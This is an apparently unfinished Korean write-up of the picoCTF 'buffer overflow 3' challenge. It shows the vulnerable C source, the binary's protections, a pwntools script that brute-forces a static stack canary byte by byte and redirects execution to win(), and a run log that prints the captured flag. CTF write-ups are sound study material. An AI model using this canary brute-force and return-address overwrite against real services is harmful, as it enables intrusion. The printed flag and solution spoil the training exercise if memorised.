# [buffer overflow 3 (작성 중)](https://play.picoctf.org/practice/challenge/260?category=6&originalEvent=70&page=2&search=)
<br />

- [Description](#description)
- [Exploitation](#exploitation)
  * [1. 오프셋 구하기](#1-오프셋-구하기)
  * [2. win()함수 인자의 정확한 오프셋 확인하기](#2-win함수-인자의-정확한-오프셋-확인하기)
- [FLAG](#flag)
<br />

# Discription
> Do you think you can bypass the protection and get the flag?
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    fflush(stdout);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    fflush(stdout);
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      fflush(stdout);
      exit(0);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```
<br />

**Binary Protections:**
```yaml
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=880ddfdc7ef13c4139ab8a80cc3d8225251a331f, for GNU/Linux 3.2.0, not stripped

[*] '/home/kali/pico/buffer_overflow_3/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<br />

# Exploitation
문제에서 제공되는 정보 및 취약점을 취합해보면 다음과 같습니다.
```text
1. 32비트 환경
2. win 호출 -> FLAG 출력
3. canary.txt로 canary 생성
4. read(0,buf,count); -> 스택 버퍼 오버플로우 발생 여부 있음.
5.
```

```python
from pwn import *
from tqdm import trange, tqdm
from string import printable

def conn():
    if len(sys.argv) == 3:
        host, port = sys.argv[1], int(sys.argv[2])
        p = remote(host, port)
    else:
        p = e.process()
    return p

def send(proc, value):
    proc.sendafter(b">", b"100\n")
    proc.sendafter(b">", value)

def get_cnry():
    pbar = tqdm(total=len(printable)*4, desc="[+] Finding Canary", ascii=" =", ncols=80)

    cnry = b""
    for i in range(4): 
        for idx, c in enumerate(printable):
            with context.quiet:
                p = conn()

                send(p, flat({0x40:cnry}, c.encode()))

                pbar.update(1)
    
                if b"Ok..." in p.recvall():
                    cnry += c.encode()
                    pbar.update(len(printable)-idx-1)
                    break

    tqdm.write(f"[+] Found Canary: {cnry}")
    return cnry

e = ELF("./vuln", checksec=False)
p = conn()

cnry = get_cnry()
send(p, flat({0x40:cnry}, {0x10:e.sym["win"]}))
p.interactive()
```
<br />

# FLAG
```bash
$ python3 test.py saturn.picoctf.net 52435
[+] Opening connection to saturn.picoctf.net on port 52435: Done
[+] Found Canary: b'BiRd'
[+] Finding Canary: 100%|=====================| 400/400 [01:44<00:00,  3.81it/s]
[*] Switching to interactive mode
 Ok... Now Where's the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_0bf0b08e}
[*] Got EOF while reading in interactive
$
```
